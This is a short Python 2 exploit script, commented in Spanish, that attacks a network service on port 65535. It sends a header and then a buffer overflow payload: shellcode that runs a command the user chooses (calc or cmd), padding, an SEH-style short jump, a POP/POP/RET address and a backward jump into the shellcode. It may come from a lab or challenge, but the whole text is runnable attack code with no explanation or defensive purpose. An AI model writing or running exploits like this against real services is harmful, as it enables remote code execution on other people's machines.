#!/usr/bin/python

import socket
import struct
import sys

from shellcodekitchen.core import ExecShellcode

if __name__ == "__main__":
	if len(sys.argv) != 3:
		print "$ ./%s ip comando" % sys.argv[0]
		print "ahhh no ponerse inventivo, comando es calc o cmd"
		sys.exit()

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((sys.argv[1], 65535))
	if s.recv(4) == "OK\n\n":
		print "[x] OK recibido"
		direccion = 0x7C800000
		tamanio = 2147483648

		packet = struct.pack("<LL", direccion, tamanio)

		shellcode = ExecShellcode(sys.argv[2])
		#shellcode = Win32Shellcode()
		#shellcode.syscall("WinExec", sys.argv[2])
		#shellcode.quit()

	        print "[*] Exploiteando"
		s.send(packet)
	
		fruta = shellcode.getfruit()
	        fruta += "A"*(0x448-len(shellcode.getfruit()))
	        fruta += "\xEB\x06\x90\x90"
	        fruta += struct.pack("<L", 0x401010) # POP EBX/POP EBP/RETN
		fruta += "\xE9\xAB\xFB\xFF\xFF" #JMP principio de shellcode
	        fruta += "BBBB"*10000

		s.send(fruta)
